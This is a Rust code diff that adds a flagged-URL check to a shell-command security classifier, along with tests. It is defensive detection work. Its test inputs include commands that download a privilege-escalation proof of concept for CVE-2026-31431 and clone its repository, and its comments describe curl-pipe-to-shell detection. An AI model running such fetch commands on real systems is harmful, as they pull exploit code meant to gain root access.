@@ -97,6 +97,18 @@ struct Tier1 {
     npm_unsafe: Regex,
     bash_c: Regex,
     flagged_npm_packages: Vec<&'static str>,
+    flagged_urls: Vec<&'static str>,
+}
+
+const FLAGGED_URLS_TXT: &str =
+    include_str!("../../src/modules/security_guard/data/flagged_urls.txt");
+
+fn parse_flagged_urls() -> Vec<&'static str> {
+    FLAGGED_URLS_TXT
+        .lines()
+        .map(|l| l.trim())
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+        .collect()
 }
 
 /// Raw `flagged_npm.txt` — single source of truth, lives in the
@@ -148,6 +160,7 @@ impl Tier1 {
             npm_unsafe,
             bash_c,
             flagged_npm_packages: parse_flagged_npm(),
+            flagged_urls: parse_flagged_urls(),
         }
     }
 
@@ -160,6 +173,29 @@ impl Tier1 {
                 reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
                 matched: m.as_str().trim().to_owned(),
             });
+        }
+
+        // Flagged-URL fast path. Substring scan — covers fetcher
+        // calls AND any other shell shape that bakes the IOC URL
+        // into a command (e.g. `xdg-open https://copyfail.security`).
+        // Cheap: O(n × m) but n ≈ 200 chars typical, m ≈ 10 entries.
+        for needle in &self.flagged_urls {
+            if let Some(at) = line.find(needle) {
+                // Anchor the matched substring to whitespace-or-EOL
+                // boundaries so the trust-cache hash is stable
+                // across leading/trailing chrome.
+                let end = at + needle.len();
+                return Some(ClassifyResult {
+                    verdict: Verdict::Warn,
+                    category: Category::CurlPipeSh,
+                    confidence: 0.9,
+                    reason: format!(
+                        "`{}` is on the flagged-URLs list (known IOC / exploit-PoC host)",
+                        needle
+                    ),
+                    matched: line[at..end].to_owned(),
+                });
+            }
         }
 
         if let Some(m) = self.npm_unsafe.find(line) {
@@ -422,6 +458,44 @@ mod tests {
         let c = Classifier::new();
         let r = c.classify("pnpm add ua-parser-js@1.0.0");
         assert!(matches!(r.verdict, Verdict::Warn));
+    }
+
+    // -----------------------------------------------------------------------
+    // Flagged URLs.
+
+    #[test]
+    fn flagged_url_curl_copyfail() {
+        // CVE-2026-31431 PoC URL — typed unwrapped, no pipe to
+        // shell. Warning earns its keep because the PoC's whole
+        // point is "run as unprivileged user, get root".
+        let c = Classifier::new();
+        let r = c.classify("curl https://copyfail.security/poc.c -o /tmp/x.c");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(r.reason.contains("flagged-URLs"));
+    }
+
+    #[test]
+    fn flagged_url_github_theori_repo() {
+        let c = Classifier::new();
+        let r = c.classify("git clone https://github.com/theori-io/copyfail.git");
+        assert!(matches!(r.verdict, Verdict::Warn));
+    }
+
+    #[test]
+    fn flagged_url_does_not_trigger_on_clean_domain() {
+        let c = Classifier::new();
+        let r = c.classify("curl https://example.com/x.tar.gz -o /tmp/x.tar.gz");
+        assert!(matches!(r.verdict, Verdict::Safe));
+    }
+
+    #[test]
+    fn flagged_urls_data_file_loaded_non_empty() {
+        let urls = parse_flagged_urls();
+        assert!(urls.len() >= 1, "expected at least one flagged URL seed");
+        for url in &urls {
+            assert!(!url.starts_with('#'), "leaked comment: {url}");
+            assert!(!url.is_empty());
+        }
     }
 
     #[test]
